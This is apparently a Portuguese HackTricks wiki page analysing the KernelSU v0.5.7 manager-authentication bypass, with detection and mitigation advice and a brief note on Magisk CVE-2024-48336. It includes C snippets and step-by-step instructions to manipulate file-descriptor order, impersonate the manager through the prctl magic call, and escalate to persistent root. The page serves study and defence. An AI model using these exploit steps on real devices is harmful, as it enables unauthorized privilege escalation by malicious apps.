# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks como KernelSU, APatch e SKRoot aplicam patches ou hooks no kernel Android/Linux e expõem funcionalidades privilegiadas a um app manager em userspace sem privilégios. Magisk é discutido separadamente abaixo porque CVE-2024-48336 envolveu o carregamento de código no lado do manager, e não este caminho de syscall do KernelSU.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Esta página abstrai as técnicas e armadilhas identificadas em pesquisas públicas (notavelmente a análise da Zimperium sobre o KernelSU v0.5.7) para ajudar tanto red teams quanto blue teams a entender superfícies de ataque, primitivas de exploração e mitigações robustas.<sup>[[1]](#references)</sup>

---
## Padrão de arquitetura: canal do manager com syscall hook

- No KernelSU v0.5.7, um kernel hook em `prctl` recebe um valor mágico, um ID de comando e argumentos específicos do comando a partir do userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- O caller primeiro solicita o status de manager com `CMD_BECOME_MANAGER`. A autorização é específica para cada comando: `CMD_GRANT_ROOT` verifica o estado do manager/allowlist, `CMD_ALLOW_SU` é somente para o manager, e `CMD_SET_SEPOLICY` exige root nesta versão.<sup>[[2]](#references)[[11]](#references)</sup>
- Outros comandos consultam a versão/configuração ou reportam eventos do framework.<sup>[[2]](#references)</sup>
- Como qualquer app pode invocar esta interface de syscall, a correção da autenticação do manager é crítica.<sup>[[1]](#references)[[2]](#references)</sup>

Exemplo (design do KernelSU):
- Syscall com hook: prctl
- Valor mágico para redirecionar para o handler do KernelSU: 0xDEADBEEF
- Os comandos incluem: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT etc.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## Fluxo de autenticação do KernelSU v0.5.7 (conforme implementado)

Quando o userspace chama prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), o KernelSU verifica:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Verificação do prefixo do caminho
- O caminho fornecido deve começar com um prefixo esperado para o UID do caller, por exemplo, /data/data/<pkg> ou /data/user/<id>/<pkg>.
- Referência: lógica de prefixo de caminho em core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Verificação de ownership
- O caminho deve pertencer ao UID do caller.
- Referência: lógica de ownership em core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) Verificação da assinatura do APK por meio de uma varredura da tabela de FD
- Iterar pelos file descriptors abertos do processo chamador em ordem crescente de descriptor.
- Para cada arquivo regular cujo caminho começa com `/data/app/` e termina com `/base.apk`, exigir que o caminho contenha a substring do package derivada do caminho do diretório de dados fornecido.
- Verificar a assinatura do primeiro candidato que passar nessas verificações de caminho.
- Analisar a assinatura APK v2 e verificar em relação ao certificado oficial do manager.
- Referências: manager.c (iteração pelos FDs), apk_sign.c (verificação APK v2).<sup>[[3]](#references)[[4]](#references)</sup>

Se todas as verificações forem aprovadas, o kernel armazena temporariamente em cache o UID do manager; os comandos exclusivos do manager passam então a aceitar esse UID, enquanto os demais comandos mantêm seu próprio UID ou suas verificações de allowlist.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Classe de vulnerabilidade: confiar na seleção de APK derivada do caminho

O KernelSU v0.5.7 não associa o resultado da assinatura à identidade do package instalado pelo PackageManager. Em `manager.c`, o teste do package é apenas uma verificação de substring no caminho (`strstr(cwd, pkg)`); o primeiro candidato que passa nesse teste é então verificado quanto à assinatura. Portanto, um atacante pode colocar um APK legítimo do manager sob um caminho `/data/app/` que também contenha o nome do package do atacante e fazer com que ele seja selecionado primeiro.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Essa confiança indireta permite que um app sem privilégios se passe pelo manager sem possuir a signing key do manager.<sup>[[1]](#references)</sup>

Principais propriedades exploradas:<sup>[[1]](#references)[[3]](#references)</sup>
- A varredura de FD é ordenada pelo índice do descriptor, e a verificação do package é um teste de substring no caminho, não uma associação verificada entre package e identidade do APK.
- open() retorna o FD disponível de menor número. Ao fechar primeiro os FDs de números menores, um atacante pode controlar a ordem.
- Um APK do manager incluído no app pode ser colocado sob `/data/app/` em um caminho que contenha a string do package do atacante, mantendo a assinatura oficial do manager.

---
## Pré-condições do ataque

O caso concreto do KernelSU v0.5.7 exige:<sup>[[1]](#references)[[3]](#references)</sup>

- O dispositivo já está rooted com um rooting framework vulnerável (por exemplo, KernelSU v0.5.7).
- O atacante pode executar código arbitrário localmente (processo de app Android).
- Para a implementação v0.5.7, `current->real_parent` deve ter UID 0 (o comentário no código-fonte descreve isso como um requisito de filho direto do zygote); `manager.c` rejeita outros parents.<sup>[[3]](#references)</sup>
- O manager legítimo ainda não foi autenticado (por exemplo, logo após um reboot). Alguns frameworks armazenam o UID do manager em cache após o sucesso; é necessário vencer a race.<sup>[[1]](#references)</sup>

---
## Visão geral da exploração (KernelSU v0.5.7)

Etapas de alto nível (o vídeo demo mostra a prova de conceito pública em funcionamento):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Criar um caminho válido para o diretório de dados do seu próprio app, a fim de satisfazer as verificações de prefixo e ownership.
2) Colocar um base.apk legítimo do KernelSU Manager sob `/data/app/` em um caminho que contenha sua string de package e, em seguida, abri-lo em um FD de número menor que o do seu próprio base.apk.
3) Invocar prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) para passar pelas verificações.
4) Usar `CMD_GRANT_ROOT` e, em seguida, `CMD_ALLOW_SU` para obter su persistente; invocar `CMD_SET_SEPOLICY`, que exige root, somente após obter root e apenas onde houver suporte.

Observações práticas sobre a etapa 2 (ordenação de FD):<sup>[[1]](#references)</sup>
- Identificar o FD do processo correspondente ao próprio /data/app/*/base.apk percorrendo os symlinks de /proc/self/fd.
- Fechar um FD baixo (por exemplo, stdin, fd 0) e abrir primeiro o APK legítimo do manager para que ele ocupe o fd 0 (ou qualquer índice menor que o FD do próprio base.apk).
- Incluir o APK legítimo do manager no app para que seu caminho comece com `/data/app/`, termine com `/base.apk` e contenha a string do seu package. Por exemplo, um caminho dentro do diretório `lib` do seu app pode satisfazer essas verificações.<sup>[[1]](#references)[[3]](#references)</sup>

Exemplos de snippets de código (Android/Linux, somente ilustrativos):

Enumerar FDs abertos para localizar entradas base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Force um descritor de arquivo com número menor a apontar para o APK legítimo do gerenciador:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Autenticação do Manager por meio do hook `prctl` do KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Após o sucesso, comandos privilegiados (exemplos):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: promover o processo atual para root
- CMD_ALLOW_SU: adicionar seu pacote/UID à allowlist para su persistente
- CMD_SET_SEPOLICY: ajustar a política do SELinux após obter root; o KernelSU v0.5.7 verifica UID 0 para este comando.<sup>[[2]](#references)</sup>

Dica de race/persistência:
- Registre um receiver de BOOT_COMPLETED no AndroidManifest (`RECEIVE_BOOT_COMPLETED`) para iniciar após o reboot e tentar a autenticação antes do manager real; a permissão autoriza o recebimento de `ACTION_BOOT_COMPLETED`, mas não garante, por si só, prioridade de agendamento.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Orientações de detecção e mitigação

Para desenvolvedores de frameworks:
- Vincule a autenticação ao pacote/UID do caller, não a FDs arbitrários:
- Resolva o pacote do caller a partir do UID e verifique-o em relação à assinatura do pacote instalado (via PackageManager), em vez de fazer scanning de FDs.
- Se for apenas no kernel, use a identidade estável do caller (task creds) e valide em uma fonte de verdade estável gerenciada pelo init/helper de userspace, não pelos FDs do processo.
- Evite verificações de prefixo de path como identidade; elas podem ser trivialmente satisfeitas pelo caller.
- Use challenge–response baseado em nonce pelo channel e limpe qualquer identidade de manager armazenada em cache no boot ou em eventos importantes.
- Considere IPC autenticado baseado em binder em vez de sobrecarregar syscalls genéricas quando viável.

Para defenders/blue team:
- Detecte a presença de rooting frameworks e processos de manager; monitore chamadas prctl com magic constants suspeitas (por exemplo, 0xDEADBEEF) se você tiver telemetria do kernel.<sup>[[1]](#references)[[11]](#references)</sup>
- Em frotas gerenciadas, bloqueie ou gere alertas para boot receivers de pacotes não confiáveis que tentem rapidamente executar comandos privilegiados do manager após o boot.
- Garanta que os dispositivos estejam atualizados para versões corrigidas do framework; invalide os IDs de manager armazenados em cache durante atualizações.

Limitações do ataque:<sup>[[1]](#references)[[2]](#references)</sup>
- Afeta somente dispositivos que já possuem root por meio de um framework vulnerável.
- Normalmente requer um reboot/janela de race antes que o manager legítimo se autentique (alguns frameworks armazenam o UID do manager em cache até serem resetados).

---
## Notas relacionadas entre frameworks

- A autenticação baseada em password (por exemplo, builds históricos do APatch/SKRoot) pode ser fraca se as passwords forem fáceis de adivinhar ou sofrerem brute force, ou se as validações apresentarem bugs.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- A autenticação baseada em pacote/assinatura (por exemplo, KernelSU) é mais forte em princípio, mas deve ser vinculada ao caller real, não a artefatos derivados de paths selecionados por meio de scans de FD.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: a CVE-2024-48336 afetou builds anteriores ao Canary 27007 que carregavam código de um pacote GMS não verificado, permitindo que um app local executasse código no app Magisk e escalasse para root sem interação do usuário.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – O rooting de todo o mal: falhas de segurança que poderiam comprometer seu dispositivo móvel](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – verificações de autenticação em core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – iteração de FD, verificação de pacote e chamada de assinatura em manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – verificação de APK v2 em apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Projeto KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Problema #8279 do Magisk – verificar se GMS é um app do sistema](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Vídeo de demonstração do PoC do KSU (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – identificadores de comandos em ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
